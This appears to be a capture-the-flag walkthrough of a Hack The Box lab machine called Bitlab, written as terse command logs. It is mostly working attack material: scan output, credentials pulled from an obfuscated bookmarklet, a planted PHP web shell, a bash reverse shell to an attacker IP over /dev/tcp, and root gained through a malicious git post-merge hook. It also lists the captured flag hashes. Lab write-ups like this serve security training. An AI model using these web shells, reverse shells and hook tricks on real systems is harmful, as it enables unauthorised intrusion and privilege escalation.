@@ -1,0 +1,191 @@
+Machine-Name   :   Bitlab
+IP-Address     :   10.129.1.52
+
+Command-Line: sudo nmap -A 10.129.1.52
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 21:52 EST
+    Nmap scan report for 10.129.1.52
+    Host is up (0.34s latency).
+    Not shown: 998 filtered ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+    |   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+    |_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
+    80/tcp open  http    nginx
+    | http-robots.txt: 55 disallowed entries (15 shown)
+    | / /autocomplete/users /search /api /admin /profile
+    | /dashboard /projects/new /groups/new /groups/*/edit /users /help
+    |_/s/ /snippets/new /snippets/*/edit
+    | http-title: Sign in \xC2\xB7 GitLab
+    |_Requested resource was http://10.129.1.52/users/sign_in
+    |_http-trane-info: Problem with XML parsing of /evox/about
+    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+    Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 5.1 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%)
+    No exact OS matches for host (test conditions non-ideal).
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 80/tcp)
+    HOP RTT       ADDRESS
+    1   386.10 ms 10.10.14.1
+    2   386.14 ms 10.129.1.52
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 48.26 seconds
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e rb,php,txt -f -t 50 -i 200,301 -u http://10.129.1.52
+Result:
+    _|. _ _  _  _  _ _|_    v0.4.0
+    (_||| _) (/_(_|| (_| )
+
+    Extensions: rb, php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 1102600
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-19_22-18-38.log
+
+    Target: http://10.129.1.52/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.52/_20-12-19_22-18-39.txt
+
+    [22:18:39] Starting:
+    [22:18:46] 200 -   13KB - /search.php
+    [22:18:46] 200 -   13KB - /search.rb
+    [22:18:46] 200 -   13KB - /search/
+    [22:18:47] 200 -   13KB - /search
+    [22:18:49] 301 -  232B  - /help  ->  http://10.129.1.52/help/
+    [22:18:49] 200 -  870B  - /help/
+    [22:18:51] 301 -  235B  - /profile  ->  http://10.129.1.52/profile/
+    [22:18:52] 200 -    4KB - /profile/
+    [22:19:11] 200 -   13KB - /public/
+    [22:19:12] 200 -   13KB - /public
+    [22:22:52] 200 -    2KB - /robots.txt
+    [22:24:05] 200 -   16KB - /root/
+    [22:24:06] 200 -   16KB - /root
+    [22:25:28] 200 -   13KB - /explore
+    [22:25:29] 200 -   13KB - /explore/
+    [22:26:50] 301 -   85B  - /ci.php  ->  http://10.129.1.52/
+    [22:26:50] 301 -   85B  - /ci  ->  http://10.129.1.52/
+    [22:26:50] 301 -   85B  - /ci.txt  ->  http://10.129.1.52/
+    [22:26:50] 301 -   85B  - /ci.rb  ->  http://10.129.1.52/
+    [22:26:50] 301 -   85B  - /ci/  ->  http://10.129.1.52/
+
+
+Browser: 10.129.1.52/help/
+Result:
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Bookmarks</title>
+</head><body><h1>Bookmarks</h1>
+<dl><p>
+    </p><dt><h3 add_date="1564422476" last_modified="0" personal_toolbar_folder="true">Bookmarks bar</h3>
+    <dl><p>
+        </p><dt><a href="https://www.hackthebox.eu/" add_date="1554931938" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACuklEQVQ4jW2Tz2tcdRTFP+d+33szmUlGjCh0pppQrQYLlcaiRloxi2zERUUR7FYXutCVC/8AFy7MRkHc+B+04EqQLiIqKCqiBSUKRqLplCyMZl7n13vzvtfFi6Vg7/bcc7jcc46oR4ADdO87cS6YXna0jtM7Qq8J36qif9T/Y+fLWzni5nRbx5fa78h4VZBCRKpF3REYDqVHPtzbHb4F/dF/Ktbtdpsha31swTbwKsZKcTrGZqUEkKTujTmiBTcULFbxSjHOn9vf3x8HwO9YvGczJOGlWVFNh7lCkrk9sDrT+sUxp84VxEo62DcbDkQIsUjS8KAsXRgc/v2Jer3lJyxLv4gzp9WJtroxVe+hGdOh+P1qKoDl06XPzTt72wnfX2n4aGDREhGL8nzo3HXn20nQ6vBQ8ckLE3v2tRHTkfju06auftbw6zsJFtDK4yWPPTPl8ED65dvM51qeRHmaCFt33EHWbMOlzTa7PyV66sWJn39hIoC/rptf2mxr+dTMO3dHBOa4C1tPhI65O4AEhAA7P6T+6zepnn9zCMDld9tKMvzE6RLVf5U7CB1L3GsiR0GwAK2OEyNURY3MLzpmNVYbe7TvyJD3JXDHZc44F6OBhOMWbpJ8NJDGuUBe7wqQ982JW6qPiOVEnNmYcvJs6ZOhNL4hH9+QT4bSybOln9koKKcARCE5cUu93tKaZdnnsXIac9EeebrQylrBZCgWFuuk5gfyZtvZ/jrjx63Mp2OLFmobBXB86f73Qgivz2bVdJwrTTJ078qMh9cKAH7+KuPP7YSqxJvzXiZJaFRV9f7e7m9v/C/K7lV0VyxGbmVpAkjT6FlLUXLTUZSrYnSh3+9PAuB5npeDf5qXFzppB+lRoTRJUTbnZE0nSWVC5mgWKz7Y2x29kuf90a1tvE2dWcd1VGe/Jrhtnf8FOj1caqcXEh4AAAAASUVORK5CYII=">Hack The Box :: Penetration Testing Labs</a>
+        </dt><dt><a href="https://www.docker.com/" add_date="1554931981" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACE0lEQVQ4jbWTu2tUURDGf3P23JvdKxvRGIwEA1okmNSWAcFCBIs0+QfEF0hsFFtPwNIHKFosWGhhYbCzEERMQCIoiBYJCpEYAxJNk6e5u3vOGYtdkvVBsPGDYZhhHh/fnAPbwTmDU7Ntzf/Fva/XqMzfBmQz9xsj2/SCKoyOClP9wsC0MtUvxHgAKIETuAKI4iS2DpDWgMr8LXxtEGNnIOxDzCJSSDiz/wQAR15YhjqPsjTwDCcRp8bi1NDxsYtAmVp1FfQLhG8QFJF1qCdcf9dLVlonD3sp736K/XQWqOAkNhjcmbmKMILyHGO6sckc3ndTsMugBqULa2dZWRtlR+kN+foiWft7fHW8wN2Z40AvsIzIEkoOugaaI6wSwwYavhPjEhI68dVBitkuNPbg/RML5j7W7EHjDzQmiEQ0GiASQ1MjUTQakmJKqEP0F1nJH3J5YMFC/EyIHfhahgioyqa82qqw1kmzgJjXnDt4o3FSZywhvKSteJh6rYaQILLVJpvbA6ZgEfGE/BIgDKvBSTBAhRBWSNtSotYBj2qLRUizhDTboFo9xflDk6AwJgHAMNL3Ae9PkhQXyMoppfaErD0h29nwSRoQM0EtH+JC3wOcM7DF0qIqiDzm5vQkxdIxfN6HUqYgG2DnSJNXnO55i5tta9b+8hKb+qj8mfw3tDSq8IjmRxkDhmF6XGAi4txftjbwE2NZ43Pq//CoAAAAAElFTkSuQmCC">Enterprise Application Container Platform | Docker</a>
+        </dt><dt><a href="https://www.php.net/" add_date="1554931999" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAb0lEQVQ4jWNsaDjAQApgIkk1ORpY0Pjh4eIQxsqVL4m1QVNTk4ANWE0NDxeHcNFlr1+/Dld0/fp1glwmZA7cMXi4dAtWiHXILkYGyLIscFcywMLh+vXrcAamLMJJ8DDFZCCzmfC4BNl4OGCkeWoFAHM4Vw1BMLruAAAAAElFTkSuQmCC">PHP: Hypertext Preprocessor</a>
+        </dt><dt><a href="https://nodejs.org/en/" add_date="1554932008" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jW2TT4iVVRjGn+c957vfnWlmuNZgKCkEhS7cmSS2aTe00M0wQn9IsRSCIMyFMbgqdKVtok2Bi1EQvAspMHATbVwWLQpiQKjUHJs7c6/3u/f77vfvPC6u84forA6H933Oy/vjB2w7CzcX3Mb9/A/vv3Xh9plfz9489cvpq+/M/V8NAHD8CNc+jhoAPr4zv3+SzUVfR++ZYpZ5QL+fBzNcQ8Clr08sLW8EtY+3a24kvXv99ZnZl3afi0L86WQ8OVX1glR5hYoYpgVdw5G1EiOv9P7ufHn1/PfJ5gSnb8/NT+2ILkZuYl8YGFzdKK00jxChLoCiCMiyvPLeR1PTTSDojxpavDz/7S1789zR2ezfaMk89+XDsgxBAuApEgGEQICE0RdlqUE/K513+//pdJbwwczztucVb3XSHKaPGczDAQQkwiAYRKMAiQLrOkCC6z4ZhIdrnfTgnlfNWvFIzThivtY0lQAgApSe/S6BBEmjyrpmFYIe9boWAtiabcl6+SyjmLQ6QtH3NAcoiOQ2TAAUSEDoDRKm+QjeO/Y6PRqeG8AZETUMf/71BEUeYEZIgKQt3hSMRFYV8GaILQKmpmGjaiQfU0kxxOp6X49XUjhPSALJbSGERIBQpRrNhlerSGXNVpMZ07Cy3g2NhuejlUSDtJD3JkHjJRICJFCiyKwqQgjSzhdepE3s7YYHq+szRajNOauKssKDhz2ajTEqiAgaoxxvo3beLCmy6coVwb557ae1pFueNPKei13U8I4rnaTqDTK5yCRKGk9QEaSfiCIG3Cvq6mT7wztdBwD3f7z/+643dl8nANIOoWGNPCuxq7VDdQXUQXSxd6Msz7O8uDJYzU7c/fzuz1uUFuDQHst05OKRA867xVCFtw+8vBc7p1sYpgVGo/JGkiaXrn1067f/9myZuYBNVQ9/cfjY0a/mlj/77szyJzdOHdvUeVyzKeFT9k18v9LwrSUAAAAASUVORK5CYII=">Node.js</a>
+        </dt><dt><a href="javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" add_date="1554932142">Gitlab Login</a>
+    </dt></dl><p>
+</p></dt></dl><p>
+
+</p></body></html>
+
+
+Notes: Taking the "Gitlab Login" javascript in inputting the variable into the console. Then calling the variable.
+
+javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
+document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];
+document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
+
+
+JS-CONSOLE:
+
+var _0x4b18=
+["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
+
+undefined
+_0x4b18
+(6) […]
+​
+    0: "value"
+    ​
+    1: "user_login"
+    ​
+    2: "getElementById"
+    ​
+    3: "clave"
+    ​
+    4: "user_password"
+    ​
+    5: "11des0081x"
+    ​
+    length: 6
+​
+<prototype>: Array []
+
+
+Notes: Username and Password found.
+user_login: clave
+user_password: 11des0081x
+
+Refer-to-File: /bitlab_js1.js
+
+Notes: Entering credentials into 10.129.1.52
+Result: *** ACCESS GRANTED ***
+
+Notes: Entered into /root/profile. Found a .git repo. Created a new branch called uk47. Within that branch I created a new file called shell.php.
+File-Contents-Of: shell.php: <?php echo "Hello from the other side"; system($_REQUEST['cmd']); ?>
+Browser: 10.129.1.52/profile/shell.php?cmd=whoami
+Notes: Turned Intercept ON. Sent http to Repeater. Changed request to a "POST".
+Command-Line: nc -nlvp 6016
+Result:
+    Listening on [any] 6016 ...
+
+Repeater: cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.147/6016 0>&1'
+Notes: CTRL+U to URL-ENCODE the data.
+Result: Port 6016 turned into "www-data"
+Result:
+    www-data@bitlab:/var/www/html/profile$
+
+www-data@bitlab:/var/www/html/profile$ sudo -l
+Result:
+    Matching Defaults entries for www-data on bitlab:
+        env_reset, exempt_group=sudo, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User www-data may run the following commands on bitlab:
+        (root) NOPASSWD: /usr/bin/git pull
+
+Notes: Only allowed to "git pull" as sudo.
+
+www-data@bitlab:/var/www/html/profile$ cd ../
+www-data@bitlab:/var/www/html$ mkdir /dev/shm/uk47
+www-data@bitlab:/var/www/html$ cp -r profile/ /dev/shm/uk47
+www-data@bitlab:/var/www/html$ cd /dev/shm/uk47/profile/.git/hooks
+www-data@bitlab:/dev/shm/uk47/profile/.git/hooks$ touch post-merge
+www-data@bitlab:/dev/shm/uk47/profile/.git/hooks$ chmod +x post-merge
+www-data@bitlab:/dev/shm/uk47/profile/.git/hooks$ ehco '#!/bin/bash' >> post-merge
+www-data@bitlab:/dev/shm/uk47/profile/.git/hooks$ ehco 'bash -c "bash -i >& /dev/tcp/10.10.14.147/6001 0>&1"' >> post-merge
+Command-Line: nc -nlvp 6001
+Result:
+    Listening on [any] 6001 ...
+Notes: Went back into /root/profile on browser. Created a new file called uk47. Committed the file, then merged file.
+
+www-data@bitlab:/dev/shm/uk47/profile/.git$ sudo git pull
+
+Notes: Command-Line listeining on 6001 turn into "root" shell:
+Result:
+    connect to [10.10.14.147] from (UNKNOWN) [10.129.1.52] 43928
+    bash: cannot set terminal process group (1318): Inappropriate ioctl for device
+    bash: no job control in this shell
+    root@bitlab:/dev/shm/uk47/profile#
+
+root@bitlab:/dev/shm/uk47/profile# cat /home/clave/user.txt
+Result: 1e3fd81ec3aa2f1462370ee3c20b8154
+    *** USER OWNED ***
+root@bitlab:/dev/shm/uk47/profile# cat /root/root.txt
+Result: 8d4cc131757957cb68d9a0cddccd587c
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
